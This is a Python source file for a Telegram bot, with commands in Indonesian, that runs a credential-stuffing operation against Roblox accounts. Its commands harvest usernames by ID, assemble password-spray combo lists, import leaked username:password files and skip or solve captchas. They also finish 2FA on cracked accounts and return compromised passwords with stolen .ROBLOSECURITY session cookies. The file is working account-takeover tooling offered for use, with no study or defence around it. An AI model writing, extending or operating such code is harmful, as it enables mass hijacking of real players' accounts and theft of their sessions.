import json, logging, os, subprocess, threading, time
import urllib.error, urllib.parse, urllib.request

import backup, config, gencombo, harvest, probe, store

log = logging.getLogger("svc.tg")


def tg(token, method, params=None, timeout=60):
    url = "https://api.telegram.org/bot%s/%s" % (token, method)
    data = urllib.parse.urlencode(params or {}).encode()
    req = urllib.request.Request(url, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode()
            log.warning("tg %s -> HTTP %s %s", method, e.code, body[:200])
            return json.loads(body)
        except Exception:
            return None
    except Exception as e:
        log.warning("tg %s err: %r", method, e)
        return None


HELP = """svc
/doctor - cek token, owner, IP, header, csrf, login
/owner [id] - lihat/set owner
/probe - cek endpoint & UA
/capraw - dump header captcha mentah
/cap [n] - status captcha + daftar
/mode auto|blast - auto=solve captcha, blast=lewatin
/warm [token] - status warm / kirim token manual
/retrycaptcha - balikin combo captcha ke antrian
/retryinvalid - balikin combo 'soft' ke antrian
/soft - jumlah combo soft
/2fa <user> <kode> - selesain 2FA
/harvest [start] [count] - panen username by ID
/users - jumlah akun terkumpul
/gen spray|deep [pwlimit] [userlimit] [cap] - rakit combo
/check on|off - mulai/stop checker
/status - progress
/hits [n] /hit <user> /cookie <user>
/dead [n] /retry /reset
/backup /restore /pw [n] /log [n] /update
kirim file .txt - auto: ada ':' = combo, tanpa ':' = password
kalau ada WARM NEEDED, balas tokennya langsung ke chat ini"""


class Bot:
    def __init__(self, token, owner, stop, pool):
        self.token, self.owner, self.stop, self.pool = token, owner, stop, pool
        self.offset = int(store.get_state("tg_offset") or 0)
        self.chat = owner or 0

    def set_owner(self, chat):
        self.owner = chat
        self.chat = chat
        try:
            with open(config.OWNER_FILE, "w") as f:
                f.write(str(chat))
        except Exception:
            pass
        log.info("owner di-set ke %s", chat)

    def send(self, text):
        text = str(text)
        for i in range(0, max(1, len(text)), 3900):
            r = tg(self.token, "sendMessage",
                   {"chat_id": self.chat, "text": text[i:i + 3900],
                    "disable_web_page_preview": "true"})
            if r and not r.get("ok"):
                log.warning("send gagal: %s", str(r)[:200])
            time.sleep(0.25)

    def run(self):
        while not self.stop.is_set():
            js = tg(self.token, "getUpdates",
                    {"offset": self.offset, "timeout": 50,
                     "allowed_updates": json.dumps(["message"])}, timeout=70)
            if not js or not js.get("ok"):
                log.warning("getUpdates gagal: %s", str(js)[:200])
                time.sleep(3)
                continue
            for upd in js.get("result", []):
                self.offset = upd["update_id"] + 1
                store.set_state("tg_offset", self.offset)
                try:
                    self.handle(upd)
                except Exception as e:
                    log.warning("handle err: %r", e)
                    self.send("err: %r" % e)

    def handle(self, upd):
        m = upd.get("message") or {}
        chat = (m.get("chat") or {}).get("id")
        if chat is None or (m.get("chat") or {}).get("type") != "private":
            return
        if self.owner and chat != self.owner and not config.AUTO_OWNER:
            log.info("abaikan chat %s (owner %s)", chat, self.owner)
            return
        if not self.owner:
            self.set_owner(chat)
            self.send("owner di-set ke %s. kirim /help" % chat)
        elif chat != self.owner:
            log.info("chat %s != owner %s (AUTO_OWNER)", chat, self.owner)
        self.chat = chat

        if m.get("document"):
            return self.import_doc(m["document"])

        text = (m.get("text") or "").strip()
        if not text.startswith("/"):
            if self.pool.warm_status() and len(text) > 8:
                return self.send("token %s" % ("diterima" if self.pool.submit_warm(text)
                                               else "gak kepake"))
            return

        a = text.split()
        c = a[0].split("@")[0].lower()
        arg = a[1:]

        if c in ("/start", "/help"):
            self.send(HELP)
        elif c == "/doctor":
            threading.Thread(target=self._doctor, daemon=True).start()
        elif c == "/owner":
            if arg:
                self.set_owner(int(arg[0]))
            self.send("owner=%s chat=%s auto=%s" % (self.owner, self.chat, config.AUTO_OWNER))
        elif c == "/status":
            st = store.stats()
            self.send("users=%d hits=%d soft=%d\ncombos=%s\nchecker=%s mode=%s\n"
                      "captcha=%d rate=%.2f\nstats=%s" % (
                          st["users"], st["hits"], store.soft_count(), st["combos"],
                          "PAUSED" if self.pool.paused else "RUNNING", self.pool.mode,
                          store.captcha_count(), self.pool.captcha_rate(), self.pool.stats))
        elif c == "/capraw":
            threading.Thread(target=lambda: self.send(probe.cap_probe()), daemon=True).start()
        elif c == "/probe":
            threading.Thread(target=lambda: self.send(probe.main()), daemon=True).start()
        elif c == "/cap":
            self.send("captcha=%d rate=%.2f mode=%s\n%s" % (
                store.captcha_count(), self.pool.captcha_rate(), self.pool.mode,
                "\n".join(store.captcha_list(int(arg[0]) if arg else 15)) or "-"))
        elif c == "/mode":
            v = (arg[0] if arg else "").lower()
            self.send("mode -> %s" % self.pool.set_mode(v) if v in ("auto", "blast")
                      else "mode sekarang: %s" % self.pool.mode)
        elif c == "/warm":
            if arg:
                self.send("token %s" % ("diterima" if self.pool.submit_warm(arg[0])
                                        else "gak ada warm pending"))
            else:
                self.send("warm pending: %s | page: %s" % (self.pool.warm_status(),
                                                           config.WARM_PAGE))
        elif c == "/retrycaptcha":
            self.send("requeue %d" % store.retry_captcha(config.MAX_CAPTCHA_TRIES))
        elif c == "/retryinvalid":
            self.send("retry %d" % store.retry_soft())
        elif c == "/soft":
            self.send("soft=%d" % store.soft_count())
        elif c == "/2fa":
            if len(arg) < 2:
                self.send("pakai: /2fa <user> <kode>")
            else:
                threading.Thread(target=self._do_2fa, args=(arg[0], arg[1]),
                                 daemon=True).start()
        elif c == "/users":
            self.send("akun: %d" % store.user_count())
        elif c == "/harvest":
            self._harvest(arg)
        elif c == "/gen":
            mode = arg[0] if arg else "spray"
            pw = int(arg[1]) if len(arg) > 1 else None
            us = int(arg[2]) if len(arg) > 2 else None
            cap = int(arg[3]) if len(arg) > 3 else None
            self.send("rakit combo... (%s)" % mode)
            n, nu, npw = gencombo.generate(mode, pw_limit=pw, user_limit=us, cap=cap)
            self.send("jadi %d combo (%d akun x %d password)" % (n, nu, npw))
        elif c == "/check":
            self.pool.paused = (arg[0] if arg else "off").lower() != "on"
            self.send("checker %s" % ("PAUSED" if self.pool.paused else "RUNNING"))
        elif c == "/hits":
            hs = store.hits(int(arg[0]) if arg else 20)
            self.send("\n".join("%s : %s%s" % (h["username"], h["password"],
                                               " [2FA]" if h.get("note") == "2fa" else "")
                                for h in hs) or "belum ada")
        elif c == "/hit":
            h = store.get_hit(arg[0]) if arg else None
            self.send("%s : %s\n%s" % (h["username"], h["password"],
                                       (h["data"] or "")[:3500]) if h else "gak ketemu")
        elif c == "/cookie":
            h = store.get_hit(arg[0]) if arg else None
            if not h:
                self.send("gak ketemu")
            elif not h.get("cookie"):
                self.send("%s : %s\ncookie kosong (2FA?)" % (h["username"], h["password"]))
            else:
                self.send("%s : %s\n\n.ROBLOSECURITY=%s" % (h["username"], h["password"],
                                                            h["cookie"]))
        elif c == "/dead":
            self.send("dead=%d\n%s" % (store.stats()["combos"].get("dead", 0),
                                       "\n".join(store.dead_list(int(arg[0]) if arg else 15))))
        elif c == "/retry":
            self.send("retry %d" % store.retry_dead())
        elif c == "/reset":
            store.reset_running()
            self.send("ok")
        elif c == "/backup":
            self.send("backup: %s" % backup.run())
        elif c == "/restore":
            try:
                self.send("restore %d hits" % backup.restore())
            except Exception as e:
                self.send("restore err: %r" % e)
        elif c == "/pw":
            self.send("\n".join(gencombo.load_passwords()[:int(arg[0]) if arg else 10]) or "kosong")
        elif c == "/log":
            try:
                with open(config.LOG_PATH, encoding="utf-8") as f:
                    self.send("".join(f.readlines()[-int(arg[0]) if arg else -40:])[-3800:] or "kosong")
            except Exception as e:
                self.send("log err: %r" % e)
        elif c == "/update":
            threading.Thread(target=self._update, daemon=True).start()
        else:
            self.send(HELP)

    def _doctor(self):
        import doctor
        ok = doctor.preflight()
        self.send("\n".join(doctor.OUT[-60:]))
        self.send("doctor: %s" % ("SIAP" if ok else "ADA MASALAH"))

    def _update(self):
        try:
            r = subprocess.run(["git", "-C", config.BASE, "pull", "--ff-only"],
                               capture_output=True, text=True, timeout=60)
            self.send("update rc=%s\n%s" % (r.returncode, (r.stdout + r.stderr)[-1500:]))
        except Exception as e:
            self.send("update err: %r" % e)

    def _harvest(self, arg):
        start = int(arg[0]) if arg else 1
        count = int(arg[1]) if len(arg) > 1 else 1000
        self.send("panen ID %d..%d" % (start, start + count))
        threading.Thread(target=lambda: self.send("selesai, %d akun baru" %
                                                 harvest.run(start, count, self.stop)),
                         daemon=True).start()

    def _do_2fa(self, user, code):
        import rblx
        raw = store.get_state("2fa:%s" % user.lower())
        h = store.get_hit(user)
        if not raw or not h:
            return self.send("gak ada challenge 2FA buat %s" % user)
        ch = json.loads(raw)
        cli = rblx.Roblox()
        cli.challenge = {"id": ch.get("id"), "type": ch.get("type") or
                         "twostepverification", "meta": ch.get("meta") or {},
                         "token": None, "meta_solved": None}
        st, det, ck = cli.login_2fa(user, h["password"], code, cli.challenge)
        if st == "hit" and ck:
            store.update_hit_cookie(user, ck, "")
            self.send("2FA OK: %s" % user)
        else:
            self.send("2FA gagal: %s %s" % (st, det))

    def import_doc(self, doc):
        fi = tg(self.token, "getFile", {"file_id": doc["file_id"]})
        if not fi or not fi.get("ok"):
            return self.send("gagal ambil file")
        url = "https://api.telegram.org/file/bot%s/%s" % (self.token,
                                                          fi["result"]["file_path"])
        raw = urllib.request.urlopen(url, timeout=120).read().decode("utf-8", "replace")
        lines = raw.splitlines()
        if any(":" in ln for ln in lines[:50]):
            rows, now, seen = [], time.time(), set()
            for line in lines:
                line = line.strip()
                if ":" not in line:
                    continue
                u, p = line.split(":", 1)
                u, p = u.strip().lower(), p.strip()
                if u and p and (u, p) not in seen:
                    seen.add((u, p))
                    rows.append((u, p, now))
            store.add_combos(rows)
            self.send("import %d combo" % len(rows))
        else:
            n = gencombo.save_passwords([ln.strip() for ln in lines if ln.strip()])
            self.send("import %d password" % n)
